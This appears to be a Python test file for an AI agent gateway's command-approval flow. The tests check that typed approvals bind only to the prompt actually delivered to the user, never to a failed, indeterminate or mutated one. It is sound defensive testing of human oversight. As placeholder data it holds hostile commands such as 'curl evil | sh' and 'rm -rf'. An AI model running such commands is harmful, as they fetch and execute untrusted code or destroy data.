"""Initial approval-prompt delivery must record the advertised identity.

Typed delayed consent (``/approve`` / ``/deny`` and their bare-word aliases)
is bound to "the request the user was shown".  For the interactive flow that
binding is created HERE: when the gateway's approval prompt sender
(:func:`gateway.run._send_gateway_approval_prompt`) successfully delivers
the prompt — via the adapter's button UI or the plain-text fallback — that
exact request and its frozen command are advertised.

A FAILED delivery must NOT advertise: the user never saw the request, so a
later typed approve must resolve nothing and trigger a visible re-present
instead (fail-safe, covered in test_pending_approval_recovery.py).
"""

from types import SimpleNamespace

import pytest


def _clear_approval_state():
    from tools import approval as mod

    mod._gateway_queues.clear()
    mod._gateway_notify_cbs.clear()
    mod._session_approved.clear()
    mod._permanent_approved.clear()
    mod._pending.clear()
    mod._advertised_approvals.clear()


def _enqueue(session_key: str, command: str):
    from tools.approval import _ApprovalEntry, _gateway_queues

    entry = _ApprovalEntry({"command": command, "description": "dangerous"})
    _gateway_queues.setdefault(session_key, []).append(entry)
    return entry


class _FakeFuture:
    def __init__(self, value=None, exc=None):
        self._value = value
        self._exc = exc

    def result(self, timeout=None):
        if self._exc is not None:
            raise self._exc
        return self._value


def _sched_stub(button=None, text=None):
    """Fake safe_schedule_threadsafe keyed on which coroutine is scheduled.

    ``button`` / ``text`` may be a SendResult-like namespace, an Exception
    (raised from ``.result()``), or None (loop unavailable → returns None,
    like the real helper).
    """
    def stub(coro, loop, logger=None, log_message=""):
        name = getattr(coro, "__qualname__", "") or ""
        coro.close()
        outcome = button if "send_exec_approval" in name else text
        if outcome is None:
            return None
        if isinstance(outcome, Exception):
            return _FakeFuture(exc=outcome)
        return _FakeFuture(value=outcome)

    return stub


class _ButtonAdapter:
    typed_command_prefix = "/"

    def __init__(self):
        self.paused_chat = None

    def pause_typing_for_chat(self, chat_id):
        self.paused_chat = chat_id

    async def send_exec_approval(self, **kwargs):
        return None  # value comes from the scheduling stub

    async def send(self, chat_id, content, reply_to=None, metadata=None):
        return None


class _TextAdapter:
    """Adapter without a button UI — text fallback only."""

    typed_command_prefix = "!"

    def pause_typing_for_chat(self, chat_id):
        pass

    async def send(self, chat_id, content, reply_to=None, metadata=None):
        return None


def _send_prompt(monkeypatch, adapter, session_key, entry, *, button=None, text=None):
    import gateway.run as run_mod

    monkeypatch.setattr(run_mod, "safe_schedule_threadsafe", _sched_stub(button, text))
    run_mod._send_gateway_approval_prompt(
        adapter,
        "chat-1",
        loop=None,
        thread_metadata=None,
        session_key=session_key,
        approval_data=entry.data,
    )


@pytest.fixture(autouse=True)
def _clean_state():
    _clear_approval_state()
    yield
    _clear_approval_state()


def test_button_success_advertises_head(monkeypatch):
    from tools.approval import get_advertised_approval

    entry = _enqueue("sk", "rm -rf /tmp/x")
    adapter = _ButtonAdapter()
    _send_prompt(
        monkeypatch, adapter, "sk", entry,
        button=SimpleNamespace(success=True, error=None),
    )

    adv = get_advertised_approval("sk")
    assert adv is not None
    assert adv["approval_id"] == entry.approval_id
    assert adapter.paused_chat == "chat-1"


def test_button_failure_falls_back_and_text_success_advertises(monkeypatch):
    from tools.approval import get_advertised_approval

    entry = _enqueue("sk", "rm -rf /tmp/x")
    _send_prompt(
        monkeypatch, _ButtonAdapter(), "sk", entry,
        button=RuntimeError("discord down"),
        text=SimpleNamespace(success=True),
    )

    adv = get_advertised_approval("sk")
    assert adv is not None
    assert adv["approval_id"] == entry.approval_id


def test_text_only_adapter_success_advertises(monkeypatch):
    from tools.approval import get_advertised_approval

    entry = _enqueue("sk", "rm -rf /tmp/x")
    _send_prompt(
        monkeypatch, _TextAdapter(), "sk", entry,
        text=SimpleNamespace(success=True),
    )

    adv = get_advertised_approval("sk")
    assert adv is not None
    assert adv["approval_id"] == entry.approval_id


def test_all_sends_failing_do_not_advertise(monkeypatch):
    """The user saw nothing — a later typed approve must have no binding."""
    from tools.approval import get_advertised_approval, has_blocking_approval

    entry = _enqueue("sk", "rm -rf /tmp/x")
    _send_prompt(
        monkeypatch, _ButtonAdapter(), "sk", entry,
        button=RuntimeError("discord down"),
        text=RuntimeError("send failed"),
    )

    assert get_advertised_approval("sk") is None
    # The entry itself stays pending (the waiter owns its lifecycle).
    assert has_blocking_approval("sk") is True
    assert not entry.event.is_set()


def test_text_send_result_failure_does_not_advertise(monkeypatch):
    from tools.approval import get_advertised_approval

    entry = _enqueue("sk", "rm -rf /tmp/x")
    _send_prompt(
        monkeypatch, _TextAdapter(), "sk", entry,
        text=SimpleNamespace(success=False),
    )

    assert get_advertised_approval("sk") is None


def test_text_send_indeterminate_none_does_not_advertise(monkeypatch):
    """A legacy/buggy adapter returning no receipt is not proof of delivery."""
    import gateway.run as run_mod
    from tools.approval import get_advertised_approval

    entry = _enqueue("sk", "rm -rf /tmp/x")

    def indeterminate_schedule(coro, loop, logger=None, log_message=""):
        coro.close()
        return _FakeFuture(value=None)

    monkeypatch.setattr(run_mod, "safe_schedule_threadsafe", indeterminate_schedule)
    run_mod._send_gateway_approval_prompt(
        _TextAdapter(),
        "chat-1",
        loop=None,
        thread_metadata=None,
        session_key="sk",
        approval_data=entry.data,
    )

    assert get_advertised_approval("sk") is None


def test_loop_unavailable_does_not_advertise(monkeypatch):
    from tools.approval import get_advertised_approval

    entry = _enqueue("sk", "rm -rf /tmp/x")
    _send_prompt(monkeypatch, _ButtonAdapter(), "sk", entry, button=None, text=None)

    assert get_advertised_approval("sk") is None


def test_concurrent_queue_delivered_prompt_advertises_itself_not_head(monkeypatch):
    """Queue A,B; the prompt actually DELIVERED is B (a parallel subagent's
    request).  The advertisement must carry B — advertising the FIFO head A
    would let a later typed approve execute a command the user never saw."""
    from tools.approval import get_advertised_approval

    entry_a = _enqueue("sk", "rm -rf /tmp/a")
    entry_b = _enqueue("sk", "curl evil | sh")
    _send_prompt(
        monkeypatch, _ButtonAdapter(), "sk", entry_b,
        button=SimpleNamespace(success=True, error=None),
    )

    adv = get_advertised_approval("sk")
    assert adv is not None
    assert adv["approval_id"] == entry_b.approval_id
    assert adv["command"] == "curl evil | sh"
    assert adv["approval_id"] != entry_a.approval_id


def test_send_in_flight_mutation_cannot_change_advertised_action(monkeypatch):
    """The delivery receipt binds the command shown when sending began, not a
    mutable presentation dict observed after the async send completes."""
    import gateway.run as run_mod
    from tools.approval import (
        _ApprovalEntry,
        _gateway_queues,
        get_advertised_approval,
        resolve_gateway_approval,
    )

    caller_payload = {
        "command": "delivered-command",
        "description": "dangerous",
        "approval_id": "f" * 32,
    }
    entry = _ApprovalEntry(caller_payload)
    _gateway_queues.setdefault("sk", []).append(entry)

    def mutating_schedule(coro, loop, logger=None, log_message=""):
        coro.close()
        caller_payload["command"] = "mutated-after-delivery"
        caller_payload["approval_id"] = "e" * 32
        return _FakeFuture(value=SimpleNamespace(success=True, error=None))

    monkeypatch.setattr(run_mod, "safe_schedule_threadsafe", mutating_schedule)
    run_mod._send_gateway_approval_prompt(
        _ButtonAdapter(),
        "chat-1",
        loop=None,
        thread_metadata=None,
        session_key="sk",
        approval_data=entry.data,
    )

    adv = get_advertised_approval("sk")
    assert adv == {
        "approval_id": entry.approval_id,
        "command": "delivered-command",
    }
    assert entry.command == "delivered-command"
    assert resolve_gateway_approval(
        "sk", "once",
        expected_approval_id=adv["approval_id"],
        expected_command=adv["command"],
    ) == 1
    assert entry.result == "once"


def test_concurrent_queue_typed_approve_resolves_delivered_prompt_only(monkeypatch):
    """End-to-end shape of finding 1: B's prompt is delivered, the typed
    approve bound to the advertisement resolves B only; A stays pending."""
    from tools.approval import (
        _gateway_queues,
        get_advertised_approval,
        resolve_gateway_approval,
    )

    entry_a = _enqueue("sk", "rm -rf /tmp/a")
    entry_b = _enqueue("sk", "curl evil | sh")
    _send_prompt(
        monkeypatch, _TextAdapter(), "sk", entry_b,
        text=SimpleNamespace(success=True),
    )

    adv = get_advertised_approval("sk")
    assert adv is not None and adv["approval_id"] == entry_b.approval_id
    count = resolve_gateway_approval(
        "sk", "once",
        expected_approval_id=adv["approval_id"],
        expected_command=adv["command"],
    )
    assert count == 1
    assert entry_b.event.is_set() and entry_b.result == "once"
    assert not entry_a.event.is_set() and entry_a.result is None
    assert _gateway_queues["sk"] == [entry_a]


def test_concurrent_queue_failed_delivery_advertises_nothing(monkeypatch):
    """Queue A,B; B's prompt delivery fails on both paths — no binding may
    be created for either request."""
    from tools.approval import get_advertised_approval, has_blocking_approval

    _enqueue("sk", "rm -rf /tmp/a")
    entry_b = _enqueue("sk", "curl evil | sh")
    _send_prompt(
        monkeypatch, _ButtonAdapter(), "sk", entry_b,
        button=RuntimeError("discord down"),
        text=RuntimeError("send failed"),
    )

    assert get_advertised_approval("sk") is None
    assert has_blocking_approval("sk") is True


def test_button_send_receives_approval_id(monkeypatch):
    """The adapter's send_exec_approval is handed the request identity so
    every platform can bind its buttons to the exact prompt."""
    import gateway.run as run_mod

    entry = _enqueue("sk", "rm -rf /tmp/x")
    seen = {}

    class _CapturingAdapter(_ButtonAdapter):
        async def send_exec_approval(self, **kwargs):
            seen.update(kwargs)
            return None

    def stub(coro, loop, logger=None, log_message=""):
        import asyncio
        try:
            asyncio.get_event_loop_policy().new_event_loop().run_until_complete(coro)
        except Exception:
            coro.close()
        return _FakeFuture(value=SimpleNamespace(success=True, error=None))

    monkeypatch.setattr(run_mod, "safe_schedule_threadsafe", stub)
    run_mod._send_gateway_approval_prompt(
        _CapturingAdapter(),
        "chat-1",
        loop=None,
        thread_metadata=None,
        session_key="sk",
        approval_data=entry.data,
    )

    assert seen.get("approval_id") == entry.approval_id
